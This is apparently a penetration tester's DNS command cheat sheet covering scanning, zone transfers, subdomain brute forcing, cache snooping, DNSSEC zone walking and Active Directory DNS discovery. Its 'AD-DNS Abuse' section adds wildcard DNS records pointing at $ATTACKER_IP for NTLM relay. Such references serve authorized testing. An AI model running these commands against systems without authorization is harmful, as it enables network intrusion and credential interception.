---
id: "wb5ns5vq7mpsirfqt"
title: "dns"
description: ""
tags: []
order: "1"
createdAt: "2026-05-30T15:42:14.645Z"
updatedAt: "2026-05-30T15:42:51.480Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"766ogtvfpmpsis7vc","order":0,"collapsed":false} -->

### kzlqwk8m3mpsis7x2
```bash
nmap -sV -sC -p 53 $TARGET
```

_Port Discovery & Scanning_

**Tags:** dns, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"kzlqwk8m3mpsis7x2","language":"bash","sectionId":"766ogtvfpmpsis7vc","tags":["dns","nmap","rustscan","recon","discovery"]} -->

### oo45gwbnmmpsis7x6
```bash
nmap -sU -p 53 $TARGET
```

**Tags:** dns, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"oo45gwbnmmpsis7x6","language":"bash","sectionId":"766ogtvfpmpsis7vc","tags":["dns","nmap","rustscan","recon","discovery"]} -->

### 4x4gnbbndmpsis7xb
```bash
nmap -p 53 --script dns-nsid,dns-recursion,dns-zone-transfer $TARGET
```

**Tags:** dns, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"4x4gnbbndmpsis7xb","language":"bash","sectionId":"766ogtvfpmpsis7vc","tags":["dns","nmap","rustscan","recon","discovery"]} -->

### qnr9f9i6xmpsis7xe
```bash
rustscan -a $TARGET -p 53 -- -sV
```

**Tags:** dns, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"qnr9f9i6xmpsis7xe","language":"bash","sectionId":"766ogtvfpmpsis7vc","tags":["dns","nmap","rustscan","recon","discovery"]} -->

## Basic DNS Queries
<!-- section: {"id":"d1s8xq694mpsis7vf","order":1,"collapsed":false} -->

### wjbwtxifdmpsis7xu
```bash
dig A $DOMAIN @$TARGET
```

_Basic DNS Queries_

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"wjbwtxifdmpsis7xu","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### r8twqu5knmpsis7xy
```bash
nslookup $DOMAIN $TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"r8twqu5knmpsis7xy","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### 18wlib36empsis7y1
```bash
host $DOMAIN $TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"18wlib36empsis7y1","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### 3737ex8mfmpsis7y4
```bash
dig -x $TARGET @$TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"3737ex8mfmpsis7y4","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### eeq1e34f0mpsis7y8
```bash
host $TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"eeq1e34f0mpsis7y8","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### 7cetjq7zhmpsis7yc
```bash
dig ANY $DOMAIN @$TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"7cetjq7zhmpsis7yc","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### lh6173lwqmpsis7yg
```bash
dig $DOMAIN @$TARGET ANY +noall +answer
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"lh6173lwqmpsis7yg","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### 4w0vkecodmpsis7yj
```bash
dig MX $DOMAIN @$TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"4w0vkecodmpsis7yj","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### ca0fm6mr2mpsis7ym
```bash
dig NS $DOMAIN @$TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"ca0fm6mr2mpsis7ym","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

### oqwss8sjimpsis7ys
```bash
dig TXT $DOMAIN @$TARGET
```

**Tags:** dns, dig, nslookup, host, enumeration
<!-- cmd: {"id":"oqwss8sjimpsis7ys","language":"bash","sectionId":"d1s8xq694mpsis7vf","tags":["dns","dig","nslookup","host","enumeration"]} -->

## Zone Transfer (AXFR)
<!-- section: {"id":"hxq9nz40mmpsis7vj","order":2,"collapsed":false} -->

### w02k3lygempsis7z8
```bash
dig axfr $DOMAIN @$TARGET
```

_Zone Transfer (AXFR) Critical misconfiguration — dumps entire zone._

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"w02k3lygempsis7z8","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### uf95cjh9pmpsis7zd
```bash
dig axfr @$TARGET $DOMAIN
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"uf95cjh9pmpsis7zd","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### jf7czxq6hmpsis7zg
```bash
dig NS $DOMAIN | grep "NS" | awk '{print $5}' | while read ns; do
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"jf7czxq6hmpsis7zg","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### nh5vzab7zmpsis7zj
```bash
echo "[*] Trying zone transfer from $ns"
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"nh5vzab7zmpsis7zj","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### tgcvxpdzampsis7zp
```bash
dig axfr $DOMAIN @$ns
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"tgcvxpdzampsis7zp","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### 0c3bzmr6rmpsis7zs
```bash
done
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"0c3bzmr6rmpsis7zs","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### 3s9rgonqlmpsis7zw
```bash
fierce --domain $DOMAIN --dns-servers $TARGET
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"3s9rgonqlmpsis7zw","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

### hmgc3bho5mpsis7zz
```bash
dnsrecon -d $DOMAIN -t axfr -n $TARGET
```

**Tags:** dns, zone-transfer, axfr, misconfiguration, unauthenticated, high-impact
<!-- cmd: {"id":"hmgc3bho5mpsis7zz","language":"bash","sectionId":"hxq9nz40mmpsis7vj","tags":["dns","zone-transfer","axfr","misconfiguration","unauthenticated","high-impact"]} -->

## DNS Enumeration & Brute Force
<!-- section: {"id":"y8z4p4i56mpsis7vn","order":3,"collapsed":false} -->

### zifsn0ejympsis808
```bash
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r $TARGET:53
```

_DNS Enumeration & Brute Force_

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"zifsn0ejympsis808","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

### 0idw5gdgampsis80b
```bash
dnsrecon -d $DOMAIN -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
```

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"0idw5gdgampsis80b","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

### fmo8iq7hnmpsis80f
```bash
dnsrecon -d $DOMAIN -t std,rvl,brt,axfr,goo
```

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"fmo8iq7hnmpsis80f","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

### 1ej5osqpgmpsis80j
```bash
fierce --domain $DOMAIN --subdomains /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
```

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"1ej5osqpgmpsis80j","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

### ttcajo1dbmpsis80m
```bash
dnsx -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $TARGET
```

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"ttcajo1dbmpsis80m","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

### ewbq3alt2mpsis80p
```bash
amass enum -passive -d $DOMAIN
```

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"ewbq3alt2mpsis80p","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

### 6u4phmk7rmpsis80t
```bash
subfinder -d $DOMAIN -o subs.txt
```

**Tags:** dns, subdomain-enum, brute-force, gobuster, dnsrecon
<!-- cmd: {"id":"6u4phmk7rmpsis80t","language":"bash","sectionId":"y8z4p4i56mpsis7vn","tags":["dns","subdomain-enum","brute-force","gobuster","dnsrecon"]} -->

## Reverse DNS Sweep
<!-- section: {"id":"m919nx9hsmpsis7vq","order":4,"collapsed":false} -->

### hsbfujw4cmpsis81c
```bash
dnsrecon -r $CIDR/24 -n $TARGET
```

_Reverse DNS Sweep_

**Tags:** dns, reverse-lookup, network-sweep, recon
<!-- cmd: {"id":"hsbfujw4cmpsis81c","language":"bash","sectionId":"m919nx9hsmpsis7vq","tags":["dns","reverse-lookup","network-sweep","recon"]} -->

### qj4au2jq6mpsis81f
```bash
for i in $(seq 1 254); do host $NETWORK.$i $TARGET 2>/dev/null | grep "domain name" ; done
```

**Tags:** dns, reverse-lookup, network-sweep, recon
<!-- cmd: {"id":"qj4au2jq6mpsis81f","language":"bash","sectionId":"m919nx9hsmpsis7vq","tags":["dns","reverse-lookup","network-sweep","recon"]} -->

### dhp99hltkmpsis81i
```bash
nmap -sL $CIDR/24 | grep "Nmap scan report"
```

**Tags:** dns, reverse-lookup, network-sweep, recon
<!-- cmd: {"id":"dhp99hltkmpsis81i","language":"bash","sectionId":"m919nx9hsmpsis7vq","tags":["dns","reverse-lookup","network-sweep","recon"]} -->

## DNS Cache Snooping
<!-- section: {"id":"b1jqjmnlympsis7vt","order":5,"collapsed":false} -->

### 2wsnmsbanmpsis81r
```bash
dig @$TARGET $DOMAIN A +norecurse
```

_DNS Cache Snooping Determine which domains a DNS server has cached (passive reconnaissance)._

**Tags:** dns, cache-snooping, passive-recon, unauthenticated
<!-- cmd: {"id":"2wsnmsbanmpsis81r","language":"bash","sectionId":"b1jqjmnlympsis7vt","tags":["dns","cache-snooping","passive-recon","unauthenticated"]} -->

### 6yijxewemmpsis81u
```bash
nmap -p 53 --script dns-cache-snoop --script-args dns-cache-snoop.mode=nonrecursive,dns-cache-snoop.domains={google.com,facebook.com} $TARGET
```

**Tags:** dns, cache-snooping, passive-recon, unauthenticated
<!-- cmd: {"id":"6yijxewemmpsis81u","language":"bash","sectionId":"b1jqjmnlympsis7vt","tags":["dns","cache-snooping","passive-recon","unauthenticated"]} -->

## DNSSEC Enumeration
<!-- section: {"id":"q67a35u88mpsis7vx","order":6,"collapsed":false} -->

### d41313fwympsis822
```bash
dig DNSKEY $DOMAIN @$TARGET
```

_DNSSEC Enumeration_

**Tags:** dns, dnssec, zone-walking, nsec, enumeration
<!-- cmd: {"id":"d41313fwympsis822","language":"bash","sectionId":"q67a35u88mpsis7vx","tags":["dns","dnssec","zone-walking","nsec","enumeration"]} -->

### xuef4nskympsis825
```bash
dig DS $DOMAIN @$TARGET
```

**Tags:** dns, dnssec, zone-walking, nsec, enumeration
<!-- cmd: {"id":"xuef4nskympsis825","language":"bash","sectionId":"q67a35u88mpsis7vx","tags":["dns","dnssec","zone-walking","nsec","enumeration"]} -->

### tdbu22sc1mpsis82a
```bash
dig NSEC $DOMAIN @$TARGET
```

**Tags:** dns, dnssec, zone-walking, nsec, enumeration
<!-- cmd: {"id":"tdbu22sc1mpsis82a","language":"bash","sectionId":"q67a35u88mpsis7vx","tags":["dns","dnssec","zone-walking","nsec","enumeration"]} -->

### lmwfo863pmpsis82d
```bash
dnsrecon -d $DOMAIN -t zonewalk
```

**Tags:** dns, dnssec, zone-walking, nsec, enumeration
<!-- cmd: {"id":"lmwfo863pmpsis82d","language":"bash","sectionId":"q67a35u88mpsis7vx","tags":["dns","dnssec","zone-walking","nsec","enumeration"]} -->

### fm5u9a68bmpsis82g
```bash
ldns-walk @$TARGET $DOMAIN
```

**Tags:** dns, dnssec, zone-walking, nsec, enumeration
<!-- cmd: {"id":"fm5u9a68bmpsis82g","language":"bash","sectionId":"q67a35u88mpsis7vx","tags":["dns","dnssec","zone-walking","nsec","enumeration"]} -->

## DNS Spoofing / Poisoning Check
<!-- section: {"id":"q7m5hk0sbmpsis7w0","order":7,"collapsed":false} -->

### 5z2y73qpsmpsis82s
```bash
nmap --script dns-random-srcport $TARGET
```

_DNS Spoofing / Poisoning Check_

**Tags:** dns, cache-poisoning, recursion, misconfiguration
<!-- cmd: {"id":"5z2y73qpsmpsis82s","language":"bash","sectionId":"q7m5hk0sbmpsis7w0","tags":["dns","cache-poisoning","recursion","misconfiguration"]} -->

### 40qd8xq14mpsis82w
```bash
nmap --script dns-random-txid $TARGET
```

**Tags:** dns, cache-poisoning, recursion, misconfiguration
<!-- cmd: {"id":"40qd8xq14mpsis82w","language":"bash","sectionId":"q7m5hk0sbmpsis7w0","tags":["dns","cache-poisoning","recursion","misconfiguration"]} -->

### xpy27x3g2mpsis82z
```bash
dig +recurse @$TARGET google.com
```

**Tags:** dns, cache-poisoning, recursion, misconfiguration
<!-- cmd: {"id":"xpy27x3g2mpsis82z","language":"bash","sectionId":"q7m5hk0sbmpsis7w0","tags":["dns","cache-poisoning","recursion","misconfiguration"]} -->

### 98pq579r3mpsis832
```bash
nmap --script dns-recursion -p 53 $TARGET
```

**Tags:** dns, cache-poisoning, recursion, misconfiguration
<!-- cmd: {"id":"98pq579r3mpsis832","language":"bash","sectionId":"q7m5hk0sbmpsis7w0","tags":["dns","cache-poisoning","recursion","misconfiguration"]} -->

## Internal DNS Recon (from inside network)
<!-- section: {"id":"7q5jndnxzmpsis7w3","order":8,"collapsed":false} -->

### 0brjr9j62mpsis83h
```bash
dig @$DC _ldap._tcp.$DOMAIN SRV
```

_ldap._

**Tags:** dns, internal, ad, dc-discovery, recon
<!-- cmd: {"id":"0brjr9j62mpsis83h","language":"bash","sectionId":"7q5jndnxzmpsis7w3","tags":["dns","internal","ad","dc-discovery","recon"]} -->

### qb7lgxt20mpsis83l
```bash
dig @$DC _kerberos._tcp.$DOMAIN SRV
```

_kerberos._

**Tags:** dns, internal, ad, dc-discovery, recon
<!-- cmd: {"id":"qb7lgxt20mpsis83l","language":"bash","sectionId":"7q5jndnxzmpsis7w3","tags":["dns","internal","ad","dc-discovery","recon"]} -->

### eidoov5kimpsis83o
```bash
dig @$DC _gc._tcp.$DOMAIN SRV
```

_gc._

**Tags:** dns, internal, ad, dc-discovery, recon
<!-- cmd: {"id":"eidoov5kimpsis83o","language":"bash","sectionId":"7q5jndnxzmpsis7w3","tags":["dns","internal","ad","dc-discovery","recon"]} -->

### 6w17yfdk3mpsis83t
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $DC
```

_ldap._

**Tags:** dns, internal, ad, dc-discovery, recon
<!-- cmd: {"id":"6w17yfdk3mpsis83t","language":"bash","sectionId":"7q5jndnxzmpsis7w3","tags":["dns","internal","ad","dc-discovery","recon"]} -->

### 83hltw95zmpsis83x
```bash
nslookup -type=NS $DOMAIN $DC
```

**Tags:** dns, internal, ad, dc-discovery, recon
<!-- cmd: {"id":"83hltw95zmpsis83x","language":"bash","sectionId":"7q5jndnxzmpsis7w3","tags":["dns","internal","ad","dc-discovery","recon"]} -->

## AD-DNS Abuse
<!-- section: {"id":"jjdpvqfy3mpsis7w7","order":9,"collapsed":false} -->

### 0ifxrl5urmpsis846
```bash
netexec ldap $DC -u $USER -p '$PASS' -M adidns
```

_AD-DNS Abuse_

**Tags:** dns, ad, adidns, dns-record, ntlm-relay, abuse
<!-- cmd: {"id":"0ifxrl5urmpsis846","language":"bash","sectionId":"jjdpvqfy3mpsis7w7","tags":["dns","ad","adidns","dns-record","ntlm-relay","abuse"]} -->

### 1eevh62rhmpsis849
```bash
python3 dnstool.py -u '$DOMAIN\$USER' -p '$PASS' --action add --record test --data $ATTACKER_IP $DC
```

**Tags:** dns, ad, adidns, dns-record, ntlm-relay, abuse
<!-- cmd: {"id":"1eevh62rhmpsis849","language":"bash","sectionId":"jjdpvqfy3mpsis7w7","tags":["dns","ad","adidns","dns-record","ntlm-relay","abuse"]} -->

### 1y9vtagmkmpsis84d
```bash
python3 dnstool.py -u '$DOMAIN\$USER' -p '$PASS' --action add --record "*" --data $ATTACKER_IP $DC
```

**Tags:** dns, ad, adidns, dns-record, ntlm-relay, abuse
<!-- cmd: {"id":"1y9vtagmkmpsis84d","language":"bash","sectionId":"jjdpvqfy3mpsis7w7","tags":["dns","ad","adidns","dns-record","ntlm-relay","abuse"]} -->

### 2jfi9xnzampsis84g
```bash
python3 dnstool.py -u '$DOMAIN\$USER' -p '$PASS' --action query --record "*" $DC
```

**Tags:** dns, ad, adidns, dns-record, ntlm-relay, abuse
<!-- cmd: {"id":"2jfi9xnzampsis84g","language":"bash","sectionId":"jjdpvqfy3mpsis7w7","tags":["dns","ad","adidns","dns-record","ntlm-relay","abuse"]} -->

## DNS Tunneling Detection
<!-- section: {"id":"56h4wbeknmpsis7wa","order":10,"collapsed":false} -->

### kiddbctrrmpsis84p
```bash
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20
```

_DNS Tunneling Detection_

**Tags:** dns, tunneling, detection, iodine
<!-- cmd: {"id":"kiddbctrrmpsis84p","language":"bash","sectionId":"56h4wbeknmpsis7wa","tags":["dns","tunneling","detection","iodine"]} -->

### gt9m7yyzmmpsis84s
```bash
nmap --script dns-check-zone -p 53 $TARGET
```

**Tags:** dns, tunneling, detection, iodine
<!-- cmd: {"id":"gt9m7yyzmmpsis84s","language":"bash","sectionId":"56h4wbeknmpsis7wa","tags":["dns","tunneling","detection","iodine"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"8l5oxesqxmpsis7we","order":11,"collapsed":false} -->

### zpjppxiu8mpsis853
```bash
nmap -p 53 --script "dns-*" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** dns, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"zpjppxiu8mpsis853","language":"bash","sectionId":"8l5oxesqxmpsis7we","tags":["dns","nmap","nse","vulnerability-scan"]} -->

### 3wyr0tmihmpsis857
```bash
nmap -sU -p 53 --script dns-nsid,dns-recursion,dns-service-discovery,dns-zone-transfer $TARGET
```

**Tags:** dns, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"3wyr0tmihmpsis857","language":"bash","sectionId":"8l5oxesqxmpsis7we","tags":["dns","nmap","nse","vulnerability-scan"]} -->

## Common Misconfigurations
<!-- section: {"id":"onn4cj84dmpsis7wh","order":12,"collapsed":false} -->

### 3di3jl4campsis85g
```bash
dig axfr $DOMAIN @$TARGET
```

_Common Misconfigurations_

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"3di3jl4campsis85g","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->

### tnl7kheoimpsis85j
```bash
dig @$TARGET google.com +recurse
```

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"tnl7kheoimpsis85j","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->

### 2at5f26ymmpsis85m
```bash
dig @$TARGET . NS +bufsize=4096
```

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"2at5f26ymmpsis85m","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->

### w3q1oi3s7mpsis85q
```bash
dig @$TARGET $DOMAIN DS
```

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"w3q1oi3s7mpsis85q","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->

### okdww722vmpsis85t
```bash
dig @$TARGET wildcard.$DOMAIN
```

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"okdww722vmpsis85t","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->

### nxdfykkexmpsis85x
```bash
dig @$TARGET version.bind chaos txt
```

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"nxdfykkexmpsis85x","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->

### q14cp70e0mpsis860
```bash
dig @$TARGET id.server chaos txt
```

**Tags:** dns, misconfiguration, open-resolver, amplification, zone-transfer
<!-- cmd: {"id":"q14cp70e0mpsis860","language":"bash","sectionId":"onn4cj84dmpsis7wh","tags":["dns","misconfiguration","open-resolver","amplification","zone-transfer"]} -->
